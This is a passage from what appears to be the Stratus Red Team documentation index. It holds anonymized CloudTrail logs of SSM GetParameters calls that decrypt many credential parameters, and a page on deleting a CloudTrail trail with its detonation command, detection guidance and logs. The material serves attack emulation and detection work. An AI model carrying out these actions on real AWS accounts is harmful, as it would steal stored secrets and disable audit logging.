\"AAEAAfqeTJBa9KzNy85Z/I9fugPDwcPX+6UgaeHcuXfK5NcfAAAAAGarqUAd2tcUDuJEuPOIEBFqxxAR2+Ls88vLJSSWVsgnhZkVpRH+/ddn7uN8ec0Gr584BOjtFxs2RNVM/BPT/Ka52SNZS8C4jsMXbFQyAIJCEVCy8oL+v+i5Sxfvn/fKNmLSNj8oci/vsGBMkPwPd1/3juDlgjoqjsMUTHJv+HVDfMuVm9bRqXO+FyUFppOpaqsZOfrKPumVN5p+Pa2QcTVQlegs72EzvnCarJYmoI63g5PmxWE9jhgs24rSTdm7oX6Ai4hYjGmhtZoIrFU/JGumeM7X0rivOEMRVAX//LKs+78Zyt2sPFMHFfEu7tqarKcMQDEP164enW/bwuOT+X0cn6ps1eyaQJyFQoMACCMRYDlZ0kn5c9LnQ5HqmimQnRIes6y+7CXHIhbV0ZZBsIdqXiGcPy4X7+s2VPJMq+2CTdPsmkQs0JS/p+y6PoN+k92S/HTGZpUqOBd59dT+mBmpLvCeBYoskxKZPuc/j84po9DZGsVNPRKHzqhsH5p9m9oSc+ZnEAF571cZmXM56I0BtSScsWP14HtZEEAwwV3batz4uKXbw7cHPRgBbyNVg3y6X0tjrgyk2/MD9BNlOTgrRHIJ1CAV9OQNY0WK+Y4KhXLkqebum6qTY+ijqrpwoHgsc9yXjxMxXFsZoutMiBYUWv7z22w32l3I9xXExJrU10oy8A==\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a4663305-e887-42ac-94e6-d04685e59899\",\n      \"eventName\": \"GetParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:57Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"be330b1c-725a-49bc-bac2-8d0d114c7e73\",\n      \"requestParameters\": {\n         \"names\": [\n            \"/credentials/stratus-red-team/credentials-1\",\n            \"/credentials/stratus-red-team/credentials-15\",\n            \"/credentials/stratus-red-team/credentials-20\",\n            \"/credentials/stratus-red-team/credentials-25\",\n            \"/credentials/stratus-red-team/credentials-32\",\n            \"/credentials/stratus-red-team/credentials-34\",\n            \"/credentials/stratus-red-team/credentials-35\",\n            \"/credentials/stratus-red-team/credentials-36\",\n            \"/credentials/stratus-red-team/credentials-39\",\n            \"/credentials/stratus-red-team/credentials-6\"\n         ],\n         \"withDecryption\": true\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-1\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-15\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-20\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-25\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-32\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-34\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-35\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-36\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-39\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-6\",\n            \"accountId\": \"933175858973\"\n         }\n      ],\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f7fd8826-9ac0-46a5-b7d5-55c269f59541\",\n      \"eventName\": \"GetParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:57Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"4bd8d56f-70f4-4b29-8702-b517ee503852\",\n      \"requestParameters\": {\n         \"names\": [\n            \"/credentials/stratus-red-team/credentials-11\",\n            \"/credentials/stratus-red-team/credentials-17\",\n            \"/credentials/stratus-red-team/credentials-18\",\n            \"/credentials/stratus-red-team/credentials-22\",\n            \"/credentials/stratus-red-team/credentials-26\",\n            \"/credentials/stratus-red-team/credentials-3\",\n            \"/credentials/stratus-red-team/credentials-31\",\n            \"/credentials/stratus-red-team/credentials-37\",\n            \"/credentials/stratus-red-team/credentials-38\",\n            \"/credentials/stratus-red-team/credentials-7\"\n         ],\n         \"withDecryption\": true\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-11\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-17\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-18\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-22\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-26\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-3\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-31\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-37\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-38\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-7\",\n            \"accountId\": \"933175858973\"\n         }\n      ],\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"674e3606-412b-4468-8d97-df54a290c564\",\n      \"eventName\": \"DescribeParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"76e5cae2-768a-4fce-a2d2-b162e27c8293\",\n      \"requestParameters\": {\n         \"maxResults\": 10,\n         \"nextToken\": \"AAEAAYl+RRW68eJ0xW6biiQkM0UFbgLzAw680L15/s+wHzuWAAAAAGarqT8yLEDnasB3CYBlA/iBSdCHG6jmIVUUgyWN6FIuTR9LfGXxx5xnVpiuEeGOELVuVJR35ZqhwXSVIiS57kfs3KUyffu+H0Iy3PYS9EztV7mH58Q3pE5jcU13IozWkd03XYMkAl2hgz5xX2g3SW8BGD2QeBUYmtHspZrSSpDloZoeJ+DCcQPwHRc9NjbnOnscO8TFqWvos2OmRpMtyA5BY1UAtBwkd9A6C4k2+97cBtu71URXDkT4wP4DeSPM/ZgSnZudGylYxUP7cZPwcK/uxr6cw/ihqQ7B30xIdIt9a1k81WBsCeV5KdBTXQHyUEQxMQd4uEZD1nEd30nsg+JtHF5ckuYS19zYoNCKydCr2aFg7/dNCdrZy0hvmJ+bw/QESYs8ZUMj4i7ilDoVo/I+RXQogojGBVnVES0wxCidKLyDQBDxAYur9eL4fwbstwdeFJJTP1vr822DvXDs0Q5l0P590bEanMD5ZdC/+kVkOO2LdAHfRXe8Osb6tua7PsvLpm9DYs7jjJ7gZciC18XxygX5d77FpIw4LtiDvFKrtzIjhmy6ZOKfxaDjYUlpJ5trxawf5FX0jQuLSYw0HMsZEv9tU0iVVvCGcJPPuX0V2jR8vCbUUJe1LFnROuBDkcpvfsSIcD+jV3caD14QlsFP0oT5pdi8iE4lQQs42UBpfDxMHA==\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7fbcfbae-35c6-4c93-88bf-741fe4c4ada3\",\n      \"eventName\": \"GetParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"879a4957-60a5-413d-be00-de67325a9f33\",\n      \"requestParameters\": {\n         \"names\": [\n            \"/credentials/stratus-red-team/credentials-10\",\n            \"/credentials/stratus-red-team/credentials-13\",\n            \"/credentials/stratus-red-team/credentials-14\",\n            \"/credentials/stratus-red-team/credentials-2\",\n            \"/credentials/stratus-red-team/credentials-23\",\n            \"/credentials/stratus-red-team/credentials-27\",\n            \"/credentials/stratus-red-team/credentials-29\",\n            \"/credentials/stratus-red-team/credentials-33\",\n            \"/credentials/stratus-red-team/credentials-4\",\n            \"/credentials/stratus-red-team/credentials-41\"\n         ],\n         \"withDecryption\": true\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-10\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-13\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-14\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-2\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-23\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-27\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-29\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-33\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-4\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-41\",\n            \"accountId\": \"933175858973\"\n         }\n      ],\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d487c732-d152-48b1-9897-90b3a037040d\",\n      \"eventName\": \"GetParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"b93b1643-c5ab-4c02-90d3-4bfa619ca186\",\n      \"requestParameters\": {\n         \"names\": [\n            \"/credentials/stratus-red-team/credentials-0\",\n            \"/credentials/stratus-red-team/credentials-16\",\n            \"/credentials/stratus-red-team/credentials-19\",\n            \"/credentials/stratus-red-team/credentials-21\",\n            \"/credentials/stratus-red-team/credentials-24\",\n            \"/credentials/stratus-red-team/credentials-28\",\n            \"/credentials/stratus-red-team/credentials-30\",\n            \"/credentials/stratus-red-team/credentials-5\",\n            \"/credentials/stratus-red-team/credentials-8\",\n            \"/credentials/stratus-red-team/credentials-9\"\n         ],\n         \"withDecryption\": true\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-0\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-16\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-19\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-21\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-24\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-28\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-30\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-5\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-8\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-9\",\n            \"accountId\": \"933175858973\"\n         }\n      ],\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f1283a09-788f-4b20-8b4f-0364dce2968a\",\n      \"eventName\": \"DescribeParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"48e17307-1cde-4161-8e06-322fa6e2aef0\",\n      \"requestParameters\": {\n         \"maxResults\": 10,\n         \"nextToken\": \"AAEAAaBteYGa8oU2QyrYeGJUO62kbtV8jAxUkBelmma5CqZTAAAAAGarqUCgxn/Ts/JpI10tWTxO0Tx6RGC9jR11wb7NoHX+2QDw8Ae6WOTrT/drS4ppinCT5SowtU1Tislk2nW5dyonFkinraADtk6zT6QQoDzl07aHweO32RmyFBre/v7j5Dx4RFEgqNARuE5AjxUT7+8V1CEvdisL+PlTYWA25MtdB4/sclYzUPL3Hdr6wTrmTsvvOZMCkHsV6Ug4sSh00zcNOI16NuXkSWC4yTPvJYvaxZiyp9KxkHsp38YDbY/UiKo2ijIouBErXOdGhMRn8FsK9iu2L2KAPXRLpdfihaWSujZBMEMuPgk+m/FmwkoYMEFpp/nRyOEZQjRBKCsRNIb4LJG5NXUR7vQXoa4fkXyctEwl4osDP5HN/4rH8A5DxRC25CKGMKr24mc7KYVbNvYOiCxSFD4LowdsesAKIzpq66ta7prMnAXJGTH+NauLkTXeXDhpuxtGtQuqGGjN3E2uZ+8xQSJ7/jzZMbO3UGMwxvdedgWjf53SQ8qgmXEzjs1aXxKuzefv+Of44HG3deLlSlLWU1G2Age9WJRjG90QYdxD+xJjhiCaGH83gypzZWwMuRFg6rmYAPn5Q+pan1HJYU9BFxZKYC9ZPP+4bOab7RjTn7Kt1tEkFiVCXR2HjD2P6pP7oPd/tORQYwpd4Boi8+VS2QH1oxEOhROHeVkPvpRGnw==\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"fb5e100b-273f-4cef-98e4-efc3a52a15e9\",\n      \"eventName\": \"GetParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:58Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"760b9a37-2498-4d32-b041-f153827bcc3e\",\n      \"requestParameters\": {\n         \"names\": [\n            \"/credentials/stratus-red-team/credentials-12\",\n            \"/credentials/stratus-red-team/credentials-40\"\n         ],\n         \"withDecryption\": true\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-12\",\n            \"accountId\": \"933175858973\"\n         },\n         {\n            \"ARN\": \"arn:aws:ssm:cn-west-3r:933175858973:parameter/credentials/stratus-red-team/credentials-40\",\n            \"accountId\": \"933175858973\"\n         }\n      ],\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e77574ca-5c4f-4d99-9f3d-67cbfd04aa99\",\n      \"eventName\": \"DescribeParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:55Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"7f54e3af-2dc7-4392-8d7c-9a7f018dd1a2\",\n      \"requestParameters\": {\n         \"maxResults\": 10\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/","title":"Delete CloudTrail Trail","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Defense Evasion</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Impair Defenses: Disable Cloud Logs (T1562.008)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#description","title":"Description","text":"<p>Delete a CloudTrail trail. Simulates an attacker disrupting CloudTrail logging.</p> <p>Warm-up: </p> <ul> <li>Create a CloudTrail trail.</li> </ul> <p>Detonation: </p> <ul> <li>Delete the CloudTrail trail.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.cloudtrail-delete\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#detection","title":"Detection","text":"<p>Identify when a CloudTrail trail is deleted, through CloudTrail's <code>DeleteTrail</code> event.</p> <p>GuardDuty also provides a dedicated finding type, Stealth:IAMUser/CloudTrailLoggingDisabled.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>cloudtrail:DeleteTrail</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"megov-westwest-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ee73c230-44bc-4492-8542-cfb189eae287\",\n      \"eventName\": \"DeleteTrail\",\n      \"eventSource\": \"cloudtrail.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:46:41Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.10\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"847129010505\",\n      \"requestID\": \"206c2187-a29f-45bf-86a2-a87d99ff7186\",\n      \"requestParameters\": {\n         \"name\": \"stratus-red-team-cloudtraild-trail-kvrwohmiai\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"08.1.250.216\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"cloudtrail.megov-westwest-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_a007fa03-86e2-4130-be03-ee7b7b10edcc\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAFBJ48BV9CGRBRKGM\",\n         \"accountId\": \"847129010505\",\n         \"arn\": \"arn:aws:iam::847129010505:user/christophe\",\n         \"principalId\": \"AIDALE4EP1EPEPX3SDR8\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/","title":"Disable CloudTrail Logging Through Event Selectors","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Defense Evasion</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Impair Defenses: Disable Cloud Logs (T1562.008)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#description","title":"Description","text":"<p>Disrupt CloudTrail Logging by creating an event selector on the Trail, filtering out all management events.</p> <p>Reference: 